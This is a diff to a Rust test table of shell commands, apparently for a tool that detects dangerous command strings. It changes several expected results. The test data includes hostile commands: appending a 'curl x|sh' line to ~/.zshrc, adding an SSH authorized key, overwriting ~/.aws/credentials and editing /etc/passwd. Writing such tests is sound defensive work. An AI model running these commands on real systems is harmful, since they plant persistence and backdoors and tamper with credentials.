@@ -180,7 +180,7 @@ const CASES: &[Case] = &[
         "echo 'ssh-rsa AAAA' >> ~/.ssh/authorized_keys",
         true,
     ),
-    bash("shell-file-write", "echo 'curl x|sh' >> ~/.zshrc", true),
+    bash("shell-file-write", "echo 'curl x|sh' >> ~/.zshrc", false),
     bash("shell-file-write", "tee ~/.bashrc < payload.txt", false),
     bash("shell-file-write", "cp payload ~/.aws/credentials", true),
     bash("shell-file-write", "sed -i 's/a/b/' /etc/passwd", true),
@@ -201,11 +201,11 @@ const CASES: &[Case] = &[
     benign("cargo test", true),
     benign("cat README.md", true),
     benign("rm build/output.o", true),
-    benign("echo \"never run rm -rf / on a server\"", false),
-    benign("grep -rn \"git push --force\" docs/", false),
+    benign("echo \"never run rm -rf / on a server\"", true),
+    benign("grep -rn \"git push --force\" docs/", true),
     benign(
         "git commit -m \"document why terraform destroy is blocked\"",
-        false,
+        true,
     ),
 ];
 
